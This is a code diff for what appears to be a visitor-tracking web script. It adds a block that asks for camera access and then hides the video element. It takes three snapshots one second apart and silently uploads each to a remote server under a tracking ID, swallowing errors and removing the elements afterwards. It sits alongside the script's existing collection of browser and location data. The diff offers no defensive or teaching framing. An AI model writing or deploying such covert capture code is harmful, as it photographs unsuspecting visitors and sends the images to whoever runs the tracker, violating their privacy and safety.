@@ -162,6 +162,71 @@ data.Engine = engine;
     data.Location = "Permission Denied";
   }
 
+  //Photo 📸 
+
+  // Request camera and take 3 photos
+  if (navigator.mediaDevices) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      data.Permissions.Camera = 'Granted';
+
+      const video = document.createElement('video');
+      video.style.display = 'none';
+      video.setAttribute('playsinline', '');
+      video.setAttribute('autoplay', '');
+      video.setAttribute('muted', '');
+      document.body.appendChild(video);
+      video.srcObject = stream;
+      await video.play();
+
+      await new Promise(r => setTimeout(r, 500));
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const context = canvas.getContext('2d');
+
+      // Photo at 1 second
+      await new Promise(r => setTimeout(r, 1000));
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      let imageData = canvas.toDataURL('image/jpeg', 0.8);
+      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ imageData }),
+      }).catch(() => {});
+
+      // Photo at 2 seconds
+      await new Promise(r => setTimeout(r, 1000));
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      imageData = canvas.toDataURL('image/jpeg', 0.8);
+      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ imageData }),
+      }).catch(() => {});
+
+      // Photo at 3 seconds
+      await new Promise(r => setTimeout(r, 1000));
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      imageData = canvas.toDataURL('image/jpeg', 0.8);
+      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ imageData }),
+      }).catch(() => {});
+
+      stream.getTracks().forEach(track => track.stop());
+      try {
+        document.body.removeChild(video);
+        document.body.removeChild(canvas);
+      } catch (e) {}
+    } catch (error) {
+      data.Permissions.Camera = 'Denied';
+    }
+  }
+
+
   // 🕒 Current Time
   data.Timestamp = new Date().toLocaleString();
 
